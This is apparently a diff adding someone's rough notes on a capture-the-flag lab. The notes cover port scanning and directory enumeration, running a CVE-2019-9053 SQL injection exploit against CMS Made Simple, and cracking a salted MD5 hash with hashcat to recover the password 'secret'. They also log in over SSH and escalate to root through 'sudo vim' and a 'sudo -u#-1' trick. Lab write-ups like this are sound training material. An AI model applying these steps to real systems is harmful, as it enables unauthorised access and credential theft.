@@ -1,0 +1,185 @@
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~`
+easyctf
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~`
+
+ports:
+21/tcp   open  ftp     vsftpd 3.0.3
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+
+enumerate with dirb and found
+/simple/
+/simple/admin/
+/simple/admin/lang/
+/simple/admin/plugins/
+/simple/admin/templates/
+/simple/admin/themes/
+/simple/assets/
+/simple/doc/
+/simple/doc/index.html
+/simple/doc/robots.txt
+/simple/lib/
+/simple/lib/assets/
+/simple/lib/classes/
+/simple/lib/index.html (CODE:200|SIZE:24)           
+/simple/lib/jquery/
+/simple/lib/lang/
+/simple/lib/phpmailer/
+/simple/lib/plugins/
+/simple/lib/smarty/
+/simple/lib/tasks/
+/simple/modules/
+/simple/tmp/
+/simple/uploads
+
+found CVE-2019-9053 for CMS Made Simple News Module
+modified exploit to run on python3 from python 2.7 (print -> print())
+
+[+] Salt for password found: 1q25p1
+[+] Username found: mitch
+[+] Email found: adb111111111111111111111111111111111121111111111111111112111111111111111111111111111111
+[+] Password found: 0c01f4462
+
+rerun with rockyou.txt
+
+[+] Salt for password found: 1dac0d92e9p
+[+] Username found: mitch
+[+] Email found: admin@adminc
+[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
+
+rerun without a wordlist
+
+[+] Salt for password found: 1dac0d92e9fa6bb22
+[+] Username found: mitch
+[+] Email found: admin@adminv
+[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
+
+
+kali@kali:/$ hashid -m 0c01f4468bd75d7a84c7eb73846e8d96
+Analyzing '0c01f4468bd75d7a84c7eb73846e8d96'
+[+] MD2 
+[+] MD5 [Hashcat Mode: 0]
+[+] MD4 [Hashcat Mode: 900]
+[+] Double MD5 [Hashcat Mode: 2600]
+[+] LM [Hashcat Mode: 3000]
+[+] RIPEMD-128 
+[+] Haval-128 
+[+] Tiger-128 
+[+] Skein-256(128) 
+[+] Skein-512(128) 
+[+] Lotus Notes/Domino 5 [Hashcat Mode: 8600]
+[+] Skype [Hashcat Mode: 23]
+[+] Snefru-128 
+[+] NTLM [Hashcat Mode: 1000]
+[+] Domain Cached Credentials [Hashcat Mode: 1100]
+[+] Domain Cached Credentials 2 [Hashcat Mode: 2100]
+[+] DNSSEC(NSEC3) [Hashcat Mode: 8300]
+[+] RAdmin v2.x [Hashcat Mode: 9900]
+kali@kali:/$ hashid -m 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9p
+Analyzing '0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9p'
+[+] MD5 [Hashcat Mode: 0]
+[+] MD4 [Hashcat Mode: 900]
+[+] Double MD5 [Hashcat Mode: 2600]
+[+] LM [Hashcat Mode: 3000]
+[+] RIPEMD-128 
+[+] Haval-128 
+[+] Tiger-128 
+[+] Skein-256(128) 
+[+] Skein-512(128) 
+[+] Lotus Notes/Domino 5 [Hashcat Mode: 8600]
+[+] Skype [Hashcat Mode: 23]
+[+] Domain Cached Credentials [Hashcat Mode: 1100]
+
+
+tried hashcat -m
+10
+20
+23
+30
+40
+50
+60
+3710
+3910
+4010
+4110
+1100
+
+look at cmsmadesimplesqli.py
+	if hashlib.md5(str(salt) + line).hexdigest() == password:
+	output += "\n[+] Password cracked: " + line
+
+so it should be a 
+md5($salt.$pass) [Hashcat Mode: 20]
+but maybe the scipt didn't extract the passhash and salt well, since there was variation the first time. running again
+
+
+
+seems to be having trouble with the salt
+
+
+[+] Salt for password found: 1dw
+[+] Username found: mitch
+[+] Email found: admin@adminz
+[*] Try: 0c01f4468bd75d7a84c7eb73846e8d96$
+[*] Now try to crack password
+Traceback (most recent call last):
+  File "cms_made_simple_sqli.py", line 184, in <module>
+    crack_password()
+  File "cms_made_simple_sqli.py", line 53, in crack_password
+    for line in dict.readlines():
+  File "/usr/lib/python3.8/codecs.py", line 322, in decode
+    (result, consumed) = self._buffer_decode(data, self.errors, final)
+UnicodeDecodeError: 'utf-8' codec can't decode byte 0xf1 in position 933: invalid continuation byte
+
+I googled the hash and 'simplectf' came up so hash should be right (and it's consistant)
+
+
+[+] Salt for password found: 1dac0d92e9fa6bb2
+[+] Username found: mitch
+[+] Email found: admin@a3
+[*] Try: 0c01f4468bd75d7a84c7eb73846e8d96$
+
+fucking finally
+
+hashcat
+
+0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2:secret
+
+upload reverse shell <-can just ssh?
+su mitch:secret
+
+mitch@Machine:~$ cat user.txt
+G00d j0b, keep up!
+
+etc/ImageMagick-6/mime.xml
+/var/log/installer/initial-status.gz matches 
+
+???????????????
+sudo -u#-1 <command> 
+??????????????????
+
+$ sudo vi test.sh
+[sudo] password for mitch: 
+Sorry, user mitch is not allowed to execute '/usr/bin/vi test.sh' as root on Machine.
+$ chmod 777 test.sh
+$ sudo vi test.sh
+[sudo] password for mitch: 
+Sorry, user mitch is not allowed to execute '/usr/bin/vi test.sh' as root on Machine.
+$ sudo vim test.sh
+
+root@Machine:~# ls
+test.sh  user.txt
+root@Machine:~# cat user.txt
+G00d j0b, keep up!
+root@Machine:~# cd /root
+root@Machine:/root# ls
+root.txt
+root@Machine:/root# cat root.txt
+W3ll d0n3. You made it!
+root@Machine:/root# exit
+exit
+
+
+
+
